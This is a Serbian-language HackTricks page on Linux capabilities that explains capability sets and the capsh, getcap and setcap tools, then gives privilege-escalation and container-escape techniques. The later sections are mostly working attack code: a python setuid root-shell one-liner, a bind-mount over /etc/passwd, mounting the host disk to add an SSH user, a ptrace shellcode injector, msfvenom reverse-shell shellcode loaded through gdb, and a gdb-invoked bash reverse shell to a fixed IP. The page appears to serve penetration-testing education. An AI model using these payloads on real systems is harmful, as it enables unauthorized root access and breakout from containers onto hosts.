# Linux Capabilities

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Španiji** i jedna od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo okupljanje za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux capabilities dele **root privilegije na manje, različite jedinice**, omogućavajući procesima da imaju podskup privilegija. Ovo minimizira rizike ne dodeljujući nepotrebno pune root privilegije.

### Problem:
- Normalni korisnici imaju ograničena ovlašćenja, što utiče na zadatke kao što je otvaranje mrežnog soketa koji zahteva root pristup.

### Skupovi privilegija:

1. **Inherited (CapInh)**:
- **Svrha**: Određuje privilegije koje se prenose sa roditeljskog procesa.
- **Funkcionalnost**: Kada se kreira novi proces, on nasleđuje privilegije iz ovog skupa. Korisno za održavanje određenih privilegija tokom pokretanja procesa.
- **Ograničenja**: Proces ne može steći privilegije koje njegov roditelj nije posedovao.

2. **Effective (CapEff)**:
- **Svrha**: Predstavlja stvarne privilegije koje proces koristi u bilo kojem trenutku.
- **Funkcionalnost**: To je skup privilegija koje kernel proverava da bi odobrio dozvolu za razne operacije. Za datoteke, ovaj skup može biti oznaka koja ukazuje da li su dozvoljene privilegije datoteke efikasne.
- **Značaj**: Efikasan skup je ključan za trenutne provere privilegija, delujući kao aktivan skup privilegija koje proces može koristiti.

3. **Permitted (CapPrm)**:
- **Svrha**: Definiše maksimalni skup privilegija koje proces može posedovati.
- **Funkcionalnost**: Proces može podići privilegiju iz dozvoljenog skupa u svoj efikasan skup, dajući mu mogućnost da koristi tu privilegiju. Takođe može odbaciti privilegije iz svog dozvoljenog skupa.
- **Granica**: Deluje kao gornja granica za privilegije koje proces može imati, osiguravajući da proces ne premaši svoj unapred definisan opseg privilegija.

4. **Bounding (CapBnd)**:
- **Svrha**: Postavlja plafon na privilegije koje proces može steći tokom svog životnog ciklusa.
- **Funkcionalnost**: Čak i ako proces ima određenu privilegiju u svom nasledivom ili dozvoljenom skupu, ne može steći tu privilegiju osim ako nije takođe u bounding skupu.
- **Upotreba**: Ovaj skup je posebno koristan za ograničavanje potencijala eskalacije privilegija procesa, dodajući dodatni sloj bezbednosti.

5. **Ambient (CapAmb)**:
- **Svrha**: Omogućava održavanje određenih privilegija tokom `execve` sistemskog poziva, što bi obično rezultiralo potpunim resetovanjem privilegija procesa.
- **Funkcionalnost**: Osigurava da ne-SUID programi koji nemaju povezane privilegije datoteka mogu zadržati određene privilegije.
- **Ograničenja**: Privilegije u ovom skupu podložne su ograničenjima nasledivih i dozvoljenih skupova, osiguravajući da ne premaše dozvoljena privilegije procesa.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
Za dodatne informacije proverite:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Procesi & Binarne sposobnosti

### Sposobnosti procesa

Da biste videli sposobnosti za određeni proces, koristite **status** datoteku u /proc direktorijumu. Kako bi pružila više detalja, ograničimo se samo na informacije vezane za Linux sposobnosti.\
Imajte na umu da se za sve pokrenute procese informacije o sposobnostima čuvaju po niti, dok se za binarne datoteke u datotečnom sistemu čuvaju u proširenim atributima.

Možete pronaći sposobnosti definisane u /usr/include/linux/capability.h

Možete pronaći sposobnosti trenutnog procesa u `cat /proc/self/status` ili koristeći `capsh --print` i drugih korisnika u `/proc/<pid>/status`
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Ova komanda bi trebala da vrati 5 redova na većini sistema.

* CapInh = Nasleđene sposobnosti
* CapPrm = Dozvoljene sposobnosti
* CapEff = Efikasne sposobnosti
* CapBnd = Ograničeni skup
* CapAmb = Skup ambijentalnih sposobnosti
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Ove heksadecimalne brojeve nema smisla. Koristeći capsh alat, možemo ih dekodirati u imena sposobnosti.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Hajde da proverimo sada **capabilities** koje koristi `ping`:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Iako to funkcioniše, postoji još jedan i lakši način. Da biste videli sposobnosti pokrenutog procesa, jednostavno koristite alat **getpcaps** praćen njegovim ID-jem procesa (PID). Takođe možete navesti listu ID-eva procesa.
```bash
getpcaps 1234
```
Hajde da proverimo ovde mogućnosti `tcpdump` nakon što smo binarnoj datoteci dali dovoljno mogućnosti (`cap_net_admin` i `cap_net_raw`) da presreće mrežu (_tcpdump se izvršava u procesu 9562_):
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Kao što možete videti, date sposobnosti odgovaraju rezultatima 2 načina dobijanja sposobnosti binarne datoteke.\
Alat _getpcaps_ koristi **capget()** sistemski poziv da upita dostupne sposobnosti za određenu nit. Ovaj sistemski poziv samo treba da pruži PID da bi dobio više informacija.

### Sposobnosti binarnih datoteka

Binarne datoteke mogu imati sposobnosti koje se mogu koristiti tokom izvršavanja. Na primer, veoma je uobičajeno pronaći `ping` binarnu datoteku sa `cap_net_raw` sposobnošću:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Možete **pretraživati binarne datoteke sa kapacitetima** koristeći:
```bash
getcap -r / 2>/dev/null
```
### Dropping capabilities with capsh

Ako uklonimo CAP\_NET\_RAW sposobnosti za _ping_, onda alatka ping više ne bi trebala da funkcioniše.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Pored izlaza _capsh_ samog, komanda _tcpdump_ takođe treba da izazove grešku.

> /bin/bash: /usr/sbin/tcpdump: Operacija nije dozvoljena

Greška jasno pokazuje da ping komanda nema dozvolu da otvori ICMP soket. Sada smo sigurni da ovo funkcioniše kako se očekuje.

### Ukloni Kapacitete

Možete ukloniti kapacitete binarne datoteke sa
```bash
setcap -r </path/to/binary>
```
## User Capabilities

Naizgled **je moguće dodeliti sposobnosti i korisnicima**. To verovatno znači da će svaki proces koji izvrši korisnik moći da koristi sposobnosti korisnika.\
Na osnovu [ovoga](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ovoga](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [ovoga](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) potrebno je konfigurisati nekoliko datoteka kako bi se korisniku dodelile određene sposobnosti, ali datoteka koja dodeljuje sposobnosti svakom korisniku biće `/etc/security/capability.conf`.\
Primer datoteke:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Okruženjske sposobnosti

Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje pruža sposobnosti**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Unutar **bash-a koji izvršava kompajlirani ambijentalni binarni fajl** moguće je posmatrati **nove sposobnosti** (običan korisnik neće imati nikakvu sposobnost u "trenutnom" odeljku).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
Možete **samo dodati sposobnosti koje su prisutne** u dozvoljenim i naslednim skupovima.
{% endhint %}

### Binarni fajlovi s sposobnostima / Binarni fajlovi bez sposobnosti

**Binarni fajlovi s sposobnostima neće koristiti nove sposobnosti** koje daje okruženje, međutim **binarni fajlovi bez sposobnosti će ih koristiti** jer ih neće odbaciti. Ovo čini binarne fajlove bez sposobnosti ranjivim unutar posebnog okruženja koje dodeljuje sposobnosti binarnim fajlovima.

## Sposobnosti usluga

Podrazumevano, **usluga koja se pokreće kao root će imati dodeljene sve sposobnosti**, i u nekim slučajevima to može biti opasno.\
Zato, **konfiguracioni** fajl za **uslugu** omogućava da **specifikujete** **sposobnosti** koje želite da ima, **i** **korisnika** koji treba da izvrši uslugu kako bi se izbeglo pokretanje usluge sa nepotrebnim privilegijama:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

Podrazumevano, Docker dodeljuje nekoliko sposobnosti kontejnerima. Veoma je lako proveriti koje su to sposobnosti pokretanjem:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Španiji** i jedna od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo okupljanje za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Kapaciteti su korisni kada **želite da ograničite svoje procese nakon izvršavanja privilegovanih operacija** (npr. nakon postavljanja chroot-a i vezivanja za soket). Međutim, mogu se iskoristiti tako što im se proslede zlonamerni komandi ili argumenti koji se zatim izvršavaju kao root.

Možete primorati kapacitete na programe koristeći `setcap`, i upitati ih koristeći `getcap`:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` znači da dodajete sposobnost (“-” bi je uklonio) kao Efikasnu i Dozvoljenu.

Da identifikujete programe u sistemu ili folderu sa sposobnostima:
```bash
getcap -r / 2>/dev/null
```
### Пример експлоатације

У следећем примеру бинарни фајл `/usr/bin/python2.6` је откривен као подложан преласку привилегија:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Kapaciteti** potrebni za `tcpdump` da **omogući bilo kojem korisniku da presreće pakete**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Poseban slučaj "praznih" sposobnosti

[Iz dokumenata](https://man7.org/linux/man-pages/man7/capabilities.7.html): Imajte na umu da se prazni skupovi sposobnosti mogu dodeliti programskom fajlu, i tako je moguće kreirati program sa set-user-ID-root koji menja efektivni i sačuvani set-user-ID procesa koji izvršava program na 0, ali ne dodeljuje nikakve sposobnosti tom procesu. Ili, jednostavno rečeno, ako imate binarni fajl koji:

1. nije u vlasništvu roota
2. nema postavljene `SUID`/`SGID` bitove
3. ima prazan skup sposobnosti (npr.: `getcap myelf` vraća `myelf =ep`)

onda **će taj binarni fajl raditi kao root**.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** je veoma moćna Linux sposobnost, često izjednačena sa skoro-root nivoom zbog svojih opsežnih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulacija funkcijama jezgra. Dok je neophodna za kontejnere koji simuliraju cele sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, posebno u kontejnerizovanim okruženjima, zbog svog potencijala za eskalaciju privilegija i kompromitaciju sistema. Stoga, njena upotreba zahteva stroge bezbednosne procene i oprezno upravljanje, sa jakim preferencijama za odbacivanje ove sposobnosti u kontejnerima specifičnim za aplikacije kako bi se pridržavali **principa minimalnih privilegija** i minimizovali površinu napada.

**Primer sa binarnim fajlom**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Koristeći python, možete montirati izmenjenu _passwd_ datoteku na vrh prave _passwd_ datoteke:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
I konačno **montirajte** izmenjenu `passwd` datoteku na `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
I moći ćete da **`su` kao root** koristeći lozinku "password".

**Primer sa okruženjem (Docker breakout)**

Možete proveriti omogućene sposobnosti unutar docker kontejnera koristeći:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Unutar prethodnog izlaza možete videti da je SYS\_ADMIN sposobnost omogućena.

* **Mount**

Ovo omogućava docker kontejneru da **montira host disk i slobodno mu pristupa**:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **Potpun pristup**

U prethodnoj metodi uspeli smo da pristupimo disku docker host-a.\
U slučaju da otkrijete da host pokreće **ssh** server, mogli biste **napraviti korisnika unutar diska docker host-a** i pristupiti mu putem SSH:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**To znači da možete pobjeći iz kontejnera injektovanjem shell koda unutar nekog procesa koji se izvršava unutar hosta.** Da bi se pristupilo procesima koji se izvršavaju unutar hosta, kontejner treba da se pokrene barem sa **`--pid=host`**.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** daje mogućnost korišćenja funkcionalnosti za debagovanje i praćenje sistemskih poziva koje pruža `ptrace(2)` i pozive za preuzimanje memorije kao što su `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan za dijagnostičke i monitoring svrhe, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera poput seccomp filtera na `ptrace(2)`, može značajno oslabiti bezbednost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih bezbednosnih ograničenja, posebno onih koje nameće seccomp, kao što je prikazano u [dokazima koncepta (PoC) poput ovog](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Primer sa binarnim (python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Пример са бинарним (gdb)**

`gdb` са `ptrace` способношћу:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Kreirajte shellcode sa msfvenom za ubrizgavanje u memoriju putem gdb
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debugujte root proces sa gdb i kopirajte prethodno generisane gdb linije:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Primer sa okruženjem (Docker breakout) - Još jedna zloupotreba gdb-a**

Ako je **GDB** instaliran (ili ga možete instalirati sa `apk add gdb` ili `apt install gdb` na primer) možete **debug-ovati proces sa hosta** i naterati ga da pozove funkciju `system`. (Ova tehnika takođe zahteva sposobnost `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Nećete moći da vidite izlaz komande koja je izvršena, ali će biti izvršena od strane tog procesa (tako da dobijete rev shell).

{% hint style="warning" %}
Ako dobijete grešku "No symbol "system" in current context.", proverite prethodni primer učitavanja shellcode-a u program putem gdb-a.
{% endhint %}

**Primer sa okruženjem (Docker breakout) - Ubrizgavanje shellcode-a**

Možete proveriti omogućene sposobnosti unutar docker kontejnera koristeći:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
List **процесa** који раде на **хосту** `ps -eaf`

1. Узмите **архитектуру** `uname -m`
2. Пронађите **shellcode** за архитектуру ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Пронађите **програм** за **инјекцију** **shellcode** у меморију процеса ([https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c](https://github.com/0x00pf/0x00sec\_code/blob/master/mem\_inject/infect.c))
4. **Измените** **shellcode** унутар програма и **компилирајте** га `gcc inject.c -o inject`
